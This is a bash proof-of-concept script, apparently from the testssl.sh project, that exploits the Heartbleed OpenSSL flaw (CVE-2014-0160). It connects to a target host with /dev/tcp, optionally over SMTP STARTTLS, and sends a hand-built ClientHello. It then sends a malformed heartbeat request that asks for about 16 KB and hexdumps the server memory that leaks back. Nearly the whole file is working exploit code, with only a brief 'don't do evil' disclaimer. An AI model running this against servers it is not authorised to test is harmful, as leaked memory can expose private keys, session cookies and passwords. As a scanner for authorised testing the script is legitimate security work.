#!/bin/bash 

# POC bash socket implementation of heartbleed (CVE-2014-0160), see also http://heartbleed.com/
# Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt 
#
# sockets inspired by http://blog.chris007.de/?p=238
# heartbleed mainly adapted from https://gist.github.com/takeshixx/10107280
#
###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######

readonly PS4='${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'

NODE=""
PORT="443"
SLEEP=2
SOCKREPLY=""
COL_WIDTH=32

[ -z "$1" ] && exit 1

# TLS 1.0=x01  1.1=0x02, 1.2=0x3
# the PoC contains per default only check for TLS1.0 as the is the least common denominator
TLSV=${2:-01}

heartbleed_payload="\x18\x03\x$TLSV\x00\x03\x01\x40\x00"
##                                                   ^^^^^^^ this is the thing!

client_hello="
# TLS header ( 5 bytes)
,x16,               # Content type (x16 for handshake)
x03, x$TLSV,         # TLS Version
x00, xdc,           # Length
# Handshake header
x01,               # Type (x01 for ClientHello)
x00, x00, xd8,     # Length
x03, x$TLSV,         # TLS Version
# Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
x53, x43, x5b, x90, x9d, x9b, x72, x0b,
xbc, x0c, xbc, x2b, x92, xa8, x48, x97,
xcf, xbd, x39, x04, xcc, x16, x0a, x85,
x03, x90, x9f, x77, x04, x33, xd4, xde,
x00,               # Session ID length
x00, x66,         # Cipher suites length
# Cipher suites (51 suites)
xc0, x14, xc0, x0a, xc0, x22, xc0, x21,
x00, x39, x00, x38, x00, x88, x00, x87,
xc0, x0f, xc0, x05, x00, x35, x00, x84,
xc0, x12, xc0, x08, xc0, x1c, xc0, x1b,
x00, x16, x00, x13, xc0, x0d, xc0, x03,
x00, x0a, xc0, x13, xc0, x09, xc0, x1f,
xc0, x1e, x00, x33, x00, x32, x00, x9a,
x00, x99, x00, x45, x00, x44, xc0, x0e,
xc0, x04, x00, x2f, x00, x96, x00, x41,
xc0, x11, xc0, x07, xc0, x0c, xc0, x02,
x00, x05, x00, x04, x00, x15, x00, x12,
x00, x09, x00, x14, x00, x11, x00, x08,
x00, x06, x00, x03, x00, xff,
x01,               # Compression methods length
x00,               # Compression method (x00 for NULL)
x00, x49,         # Extensions length
# Extension: ec_point_formats
x00, x0b, x00, x04, x03, x00, x01, x02,
# Extension: elliptic_curves
x00, x0a, x00, x34, x00, x32, x00, x0e,
x00, x0d, x00, x19, x00, x0b, x00, x0c,
x00, x18, x00, x09, x00, x0a, x00, x16,
x00, x17, x00, x08, x00, x06, x00, x07,
x00, x14, x00, x15, x00, x04, x00, x05,
x00, x12, x00, x13, x00, x01, x00, x02,
x00, x03, x00, x0f, x00, x10, x00, x11,
# Extension: SessionTicket TLS
x00, x23, x00, x00,
# Extension: Heartbeat
x00, x0f, x00, x01, x01
"
msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`


parse_hn_port() {
	NODE="$1"

	# strip "https", supposed it was supplied additionally
	echo $NODE | grep -q 'https://' && NODE=`echo $NODE | sed -e 's/https\:\/\///' `

	# strip trailing urlpath
	NODE=`echo $NODE | sed -e 's/\/.*$//'`

	# determine port, supposed it was supplied additionally
	echo $NODE | grep -q ':' && PORT=`echo $NODE | sed 's/^.*\://'` && NODE=`echo $NODE | sed 's/\:.*$//'`

	echo -e "\n===> connecting to $NODE:$PORT\n"
}

wait_kill(){
     pid=$1
     maxsleep=$2
     while true; do
          if ! ps $pid >/dev/null ; then
               return 0  # didn't reach maxsleep yet
          fi
          sleep 1
          maxsleep=$((maxsleep - 1))
          test $maxsleep -eq 0 && break
     done # needs to be killed:
     kill $pid >&2 2>/dev/null
     wait $pid 2>/dev/null
     return 3   # killed
}


socksend() {
	data=`echo $1`
	echo "\"$data\""
	echo -en "$data" >&5 &
	sleep $SLEEP
}


sockread() {
	reply=$(dd bs=$1 count=1 <&5 2>/dev/null)
     wait_kill $! $SLEEP
}

sockread1() {
	[[ "x$2" == "x" ]] && maxsleep=10 || maxsleep=$2
     ret=0

     ddreply=$(mktemp /tmp/ddreply.XXXXXX) || return 7
     dd bs=$1 of=$ddreply count=1 <&5 2>/dev/null &
     wait_kill $! $maxsleep
     ret=$?
     SOCKREPLY=$(cat $ddreply)
     rm $ddreply

     return $ret
}

# arg1: string to send
starttls_line0() {
	echo "$1" >&5
	cat <&5 &
     wait_kill $! $SLEEP
	#sleep $SLEEP
}

starttls_line1() {
	echo "$1" >&5
	while true; do
     	read line <&5
		echo $line
		break
	done
}

fd_socket(){
	if ! exec 5<> /dev/tcp/$NODE/$PORT; then
		echo "`basename $0`: unable to connect to $NODE:$PORT"
		exit 2
	fi

	case "$1" in # port
		25) 	starttls_line0 "EHLO testssl.sh" 
			starttls_line0 "STARTTLS" 
			;;
		443|*)  ;;
	esac
}

close_socket(){
     exec 5<&-
     exec 5>&-
     return 0
}


#### main

parse_hn_port "$1"
fd_socket $PORT

echo "##### sending standard client hello with TLS version 03,$TLSV:"
socksend "$msg" $TLSV

sockread 16384 
#sockread 10000
echo "##### reading server hello:"
#cat $SOCKREPLY | xxd | head -20
echo -e "$reply" | xxd | head -2
echo "[...]"
echo

echo "###### sending payload with TLS version 03,$TLSV:"
socksend $heartbleed_payload $TLSV

sockread 65534
echo "###### heartbleed reply: "
echo "============================="
#cat $SOCKREPLY | xxd | head -20
echo -e "$reply" | xxd -c$COL_WIDTH
echo "============================="

lines_returned=`echo -e "$reply" | xxd | wc -l`
if [ $lines_returned -gt 1 ]; then
	tput bold; tput setaf 1; echo "VULNERABLE"; tput sgr0
	ret=1
else
	tput bold; tput setaf 2; echo "ok"; tput sgr0
	ret=0
fi
echo

close_socket

exit $ret

#  vim:tw=100:ts=5:sw=5
#  $Id: heartbleed.bash,v 1.9 2015/07/01 08:12:36 dirkw Exp $ 
